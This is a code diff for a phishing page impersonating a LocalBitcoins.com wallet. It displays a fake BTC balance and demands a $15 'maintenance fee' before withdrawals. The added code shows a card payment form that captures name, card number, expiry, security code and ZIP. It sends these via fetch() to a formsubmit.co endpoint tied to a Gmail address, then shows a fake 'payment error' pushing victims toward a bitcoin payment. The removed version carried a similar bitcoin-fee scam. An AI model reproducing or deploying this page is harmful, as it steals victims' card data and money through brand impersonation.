@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Wallet Dues</title>
   <style>
     body {
@@ -9,95 +9,205 @@
       margin: 0;
       background-color: #f2f2f2;
     }
-
     .payment-form {
       background-color: white;
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 320px;
+      width: 300px;
       margin: 50px auto;
       display: none;
+      position: relative;
+      z-index: 10;
     }
-
     .payment-form h2 {
       text-align: center;
       margin-bottom: 20px;
     }
-
-    .error-message {
-      color: #b30000;
-      background-color: #ffe5e5;
-      padding: 15px;
-      border-radius: 8px;
-      font-size: 14px;
+    .card-icons {
       text-align: center;
       margin-bottom: 20px;
     }
-
-    .btc-info {
-      font-size: 14px;
-      line-height: 1.6;
-      background-color: #f8f9ff;
-      padding: 15px;
-      border-radius: 8px;
-      border: 1px dashed #6c4dff;
+    .card-icons img {
+      width: 40px;
+      margin: 0 5px;
     }
-
+    .payment-form input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .flex-row {
+      display: flex;
+      gap: 10px;
+    }
+    .payment-button {
+      background-color: #00c6c1;
+      color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .payment-button:hover {
+      background-color: #00a9a4;
+    }
     footer {
       text-align: center;
       padding: 30px 0;
       font-size: 12px;
       color: #666;
     }
-
     .text-link {
       color: #6c4dff;
       text-decoration: underline;
       cursor: pointer;
     }
+    /* Error popup styling */
+    #errorPopup {
+      display: none;
+      position: fixed;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      border: 2px solid #e74c3c;
+      padding: 25px;
+      width: 320px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      z-index: 9999;
+    }
+    #errorPopup h2 {
+      color: #e74c3c;
+      margin-top: 0;
+      text-align: center;
+    }
+    #errorPopup button {
+      display: block;
+      margin: 20px auto 0 auto;
+      background: #e74c3c;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    #errorPopup button:hover {
+      background: #c0392b;
+    }
   </style>
 </head>
 <body>
 
-<!-- Hidden Payment Section -->
-<div id="paymentSection" class="payment-form">
-  <h2>Pay Invoice</h2>
-  <div class="error-message">
-    We sincerely apologize — card payments are temporarily unavailable due to a processing issue with our payment provider. Our team is actively working to resolve this.
+  <!-- Your existing dashboard content here -->
+  <div style="text-align:center; margin-top: 30px;">
+    <h1>LocalBitcoins.com Wallet</h1>
+    <p>Wallet Balance: 3.3115321 BTC</p>
+
+    <div class="flex flex-wrap gap-4 mb-8" style="display:flex; justify-content:center; gap:10px; margin-bottom:30px;">
+      <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition"
+              onclick="alert('Verification not yet available.')">Verify Account</button>
+      <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition"
+              onclick="showPaymentPopup()">Withdraw Funds</button>
+      <button class="bg-gray-300 text-gray-600 font-semibold rounded-md py-3 px-6 cursor-not-allowed" disabled>
+        Deposit Funds (Unavailable)
+      </button>
+    </div>
+
+    <div class="text-sm text-gray-700 bg-[#f9f8ff] rounded-md p-4 break-words" style="max-width: 600px; margin: 0 auto;">
+      <strong>Wallet Address:</strong><br />
+      bc1pph7jxvya7nkdwaz8eyrmzfzsufdtfldg6hvflsn7z0gcq88np6fsfaccau
+    </div>
+
+    <!-- Payment Form Popup -->
+    <div id="paymentSection" class="payment-form">
+      <h2>Pay Invoice</h2>
+      <div class="card-icons">
+        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
+        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
+        <img src="https://img.icons8.com/color/48/000000/amex.png" alt="AmEx" />
+        <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
+      </div>
+      <form id="paymentForm">
+        <input type="number" name="amount" value="15.00" readonly />
+        <input type="text" name="name" placeholder="Name on card" required />
+        <input type="text" name="cardnumber" placeholder="Card number" required />
+        <div class="flex-row">
+          <input type="text" name="expiry" placeholder="MM / YY" style="flex:1" required />
+          <input type="text" name="cvv" placeholder="Security code" style="flex:1" required />
+        </div>
+        <input type="text" name="zip" placeholder="ZIP/Postal code" required />
+        <button type="submit" class="payment-button">Pay $15.00</button>
+      </form>
+    </div>
+
+    <!-- Error Popup -->
+    <div id="errorPopup">
+      <h2>Payment Error</h2>
+      <p>We’re sorry, but card payments are currently down due to technical issues.<br />
+        Please try again later or use BTC payment instead.</p>
+      <button onclick="closeErrorPopup()">Close</button>
+    </div>
   </div>
 
-  <div class="btc-info">
-    <strong>To restore full wallet access:</strong><br>
-    Please make a BTC payment of <strong>$15.00 USD</strong> to the wallet address below:<br><br>
-    <strong>BTC Address:</strong><br>
-    <code style="word-break: break-all;">bc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8</code><br><br>
-    You can also purchase BTC instantly at:<br>
-    <a href="https://changelly.com/buy/btc/" target="_blank">changelly.com/buy/btc/</a>
-  </div>
-</div>
+  <footer>
+    <p><strong>Contact Us:</strong> support@localbitcoins.com</p>
+    <p>
+      <a class="text-link" href="#">Privacy Policy</a> |
+      <a class="text-link" href="#">Terms of Service</a>
+    </p>
+    <p class="mt-2">© 2025 LocalBitcoins.com. All rights reserved.</p>
+  </footer>
 
-<footer>
-  <p><strong>Contact Us:</strong> support@localbitcoins.com</p>
-  <p>
-    <a class="text-link" href="#">Privacy Policy</a> |
-    <a class="text-link" href="#">Terms of Service</a>
-  </p>
-  <p class="mt-2">© 2025 LocalBitcoins.com. All rights reserved.</p>
-</footer>
-
-<script>
-  function showPaymentPopup() {
-    const proceed = confirm(
-      "Notice: Your wallet has outstanding dues that need to be settled to restore full functionality, including withdrawals.\n\nThe wallet maintenance fee of $15.00 USD is pending.\n\nTo regain access:\n1. Pay in BTC: bc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n2. Or click OK to view payment options."
-    );
-
-    if (proceed) {
-      document.getElementById("paymentSection").style.display = "block";
-      window.scrollTo(0, document.getElementById("paymentSection").offsetTop);
+  <script>
+    function showPaymentPopup() {
+      document.getElementById('paymentSection').style.display = 'block';
+      window.scrollTo(0, document.getElementById('paymentSection').offsetTop);
     }
-  }
-</script>
 
+    function closeErrorPopup() {
+      document.getElementById('errorPopup').style.display = 'none';
+      document.getElementById('paymentSection').style.display = 'none';
+    }
+
+    // AJAX form submit to FormSubmit.co
+    const form = document.getElementById('paymentForm');
+    const errorPopup = document.getElementById('errorPopup');
+    const paymentSection = document.getElementById('paymentSection');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      fetch('https://formsubmit.co/ajax/songgen994@gmail.com', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+        .then(response => response.json())
+        .then(data => {
+          // Hide payment form
+          paymentSection.style.display = 'none';
+          // Show error popup
+          errorPopup.style.display = 'block';
+          // Optionally reset the form
+          form.reset();
+        })
+        .catch(error => {
+          alert('There was an error submitting your payment. Please try again.');
+          console.error(error);
+        });
+    });
+  </script>
 </body>
 </html>
